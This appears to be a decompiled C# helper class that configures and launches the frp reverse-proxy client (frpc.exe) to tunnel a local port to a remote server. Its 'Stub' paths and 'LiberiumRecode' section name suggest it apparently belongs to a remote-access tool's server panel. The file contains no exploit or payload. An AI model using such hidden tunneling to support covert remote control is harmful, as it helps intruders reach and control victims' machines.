using System;
using System.Diagnostics;
using System.IO;
using Newtonsoft.Json;
using Server.Data;

namespace Server.Helper;

public static class FrpcManager
{
	private static Process _frpcProcess;

	private static bool _isRunning = false;

	private static readonly object _lock = new object();

	public static bool IsRunning
	{
		get
		{
			lock (_lock)
			{
				return _isRunning && _frpcProcess != null && !_frpcProcess.HasExited;
			}
		}
	}

	public static event Action<string> OnStatusChanged;

	public static event Action<string> OnOutputReceived;

	public static bool Start()
	{
		lock (_lock)
		{
			if (_isRunning && _frpcProcess != null && !_frpcProcess.HasExited)
			{
				return true;
			}
			FrpcSettings settings = LoadSettings();
			if (settings == null || string.IsNullOrEmpty(settings.ServerAddr))
			{
				FrpcManager.OnStatusChanged?.Invoke("Error: No FRPC settings configured");
				return false;
			}
			string frpcPath = GetFrpcPath();
			if (string.IsNullOrEmpty(frpcPath))
			{
				FrpcManager.OnStatusChanged?.Invoke("Error: frpc.exe not found");
				return false;
			}
			string iniPath = Path.Combine("local", "frpc_generated.ini");
			GenerateIniFile(settings, iniPath);
			try
			{
				_frpcProcess = new Process();
				_frpcProcess.StartInfo = new ProcessStartInfo
				{
					FileName = frpcPath,
					Arguments = "-c \"" + iniPath + "\"",
					UseShellExecute = false,
					CreateNoWindow = true,
					RedirectStandardOutput = true,
					RedirectStandardError = true
				};
				_frpcProcess.OutputDataReceived += delegate(object s, DataReceivedEventArgs e)
				{
					if (!string.IsNullOrEmpty(e.Data))
					{
						FrpcManager.OnOutputReceived?.Invoke(e.Data);
					}
				};
				_frpcProcess.ErrorDataReceived += delegate(object s, DataReceivedEventArgs e)
				{
					if (!string.IsNullOrEmpty(e.Data))
					{
						FrpcManager.OnOutputReceived?.Invoke("[ERR] " + e.Data);
					}
				};
				_frpcProcess.EnableRaisingEvents = true;
				_frpcProcess.Exited += delegate
				{
					_isRunning = false;
					FrpcManager.OnStatusChanged?.Invoke("Status: Disconnected");
				};
				_frpcProcess.Start();
				_frpcProcess.BeginOutputReadLine();
				_frpcProcess.BeginErrorReadLine();
				_isRunning = true;
				FrpcManager.OnStatusChanged?.Invoke("Status: Connected");
				return true;
			}
			catch (Exception ex)
			{
				_isRunning = false;
				FrpcManager.OnStatusChanged?.Invoke("Error: " + ex.Message);
				return false;
			}
		}
	}

	public static void Stop()
	{
		lock (_lock)
		{
			if (_frpcProcess != null && !_frpcProcess.HasExited)
			{
				try
				{
					_frpcProcess.Kill();
					_frpcProcess.WaitForExit(3000);
				}
				catch
				{
				}
				finally
				{
					_frpcProcess.Dispose();
					_frpcProcess = null;
				}
			}
			_isRunning = false;
			FrpcManager.OnStatusChanged?.Invoke("Status: Disconnected");
		}
	}

	public static FrpcSettings LoadSettings()
	{
		try
		{
			string path = Path.Combine("local", "FrpcSettings.json");
			if (File.Exists(path))
			{
				return JsonConvert.DeserializeObject<FrpcSettings>(File.ReadAllText(path));
			}
		}
		catch
		{
		}
		return null;
	}

	public static void SaveSettings(FrpcSettings settings)
	{
		try
		{
			if (!Directory.Exists("local"))
			{
				Directory.CreateDirectory("local");
			}
			File.WriteAllText(Path.Combine("local", "FrpcSettings.json"), JsonConvert.SerializeObject(settings, Formatting.Indented));
		}
		catch
		{
		}
	}

	private static void GenerateIniFile(FrpcSettings settings, string path)
	{
		string ini = "[common]\r\nserver_addr = " + settings.ServerAddr + "\r\nserver_port = " + settings.ServerPort + "\r\nlogin_fail_exit = true\r\nprotocol = " + settings.Protocol + "\r\nheartbeat_interval = 1000\r\nheartbeat_timeout = 1001\r\ntoken = " + settings.Token + "\r\n\r\n[LiberiumRecode]\r\ntype = " + settings.Protocol + "\r\nlocal_ip = 127.0.0.1\r\nlocal_port = " + settings.LocalPort + "\r\nremote_port = " + settings.RemotePort + "\r\n";
		File.WriteAllText(path, ini);
	}

	private static string GetFrpcPath()
	{
		string stubFrpcPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stub", "frpc", "frpc.exe");
		if (File.Exists(stubFrpcPath))
		{
			return stubFrpcPath;
		}
		string stubFrpcPath2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stub", "frpc", "frpc.exe");
		if (File.Exists(stubFrpcPath2))
		{
			return stubFrpcPath2;
		}
		string stubDirect = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stub", "frpc.exe");
		if (File.Exists(stubDirect))
		{
			return stubDirect;
		}
		string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "frpc.exe");
		if (File.Exists(localPath))
		{
			return localPath;
		}
		string localDir = Path.Combine("local", "frpc.exe");
		if (File.Exists(localDir))
		{
			return localDir;
		}
		return null;
	}

	public static FrpcSettings ParseIniFile(string iniContent)
	{
		FrpcSettings settings = new FrpcSettings();
		string[] array = iniContent.Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
		for (int i = 0; i < array.Length; i++)
		{
			string trimmed = array[i].Trim();
			if (trimmed.StartsWith("[") || trimmed.StartsWith("#") || trimmed.StartsWith(";"))
			{
				continue;
			}
			int eqIndex = trimmed.IndexOf('=');
			if (eqIndex >= 0)
			{
				string key = trimmed.Substring(0, eqIndex).Trim().ToLower();
				string value = trimmed.Substring(eqIndex + 1).Trim();
				switch (key)
				{
				case "server_addr":
					settings.ServerAddr = value;
					break;
				case "server_port":
					settings.ServerPort = value;
					break;
				case "token":
					settings.Token = value;
					break;
				case "local_port":
					settings.LocalPort = value;
					break;
				case "remote_port":
					settings.RemotePort = value;
					break;
				case "protocol":
				case "type":
					settings.Protocol = value;
					break;
				}
			}
		}
		return settings;
	}
}
